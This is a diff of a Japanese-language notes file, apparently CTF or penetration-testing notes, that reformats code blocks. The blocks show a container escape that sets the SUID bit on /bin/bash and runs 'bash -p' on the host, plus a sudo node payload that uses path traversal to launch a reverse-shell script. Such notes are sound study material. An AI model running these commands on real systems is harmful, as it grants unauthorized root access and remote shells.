@@ -83,14 +83,14 @@ tmpfs           394M     0  394M   0% /run/user/1000
 ```
 
    2. DockerContainerにて以下のコマンドを実行
-      ```
-      # cd /bin/
-      # chmod u+s ./bash
+      ```sh
+      cd /bin/
+      chmod u+s ./bash
       ```
       
    3. マシンのホスト側にて以下を実施
-      ```
-      # bash -p
+      ```sh
+      bash -p
       ```
   - 参考
     - Hacktricks
@@ -123,6 +123,6 @@ tmpfs           394M     0  394M   0% /run/user/1000
         ```
         - payload
           ```
-          # sudo /usr/bin/node /usr/local/scripts/../../../..//home/angoose/reverseshell.js
+	          # sudo /usr/bin/node /usr/local/scripts/../../../..//home/angoose/reverseshell.js
           ```
         
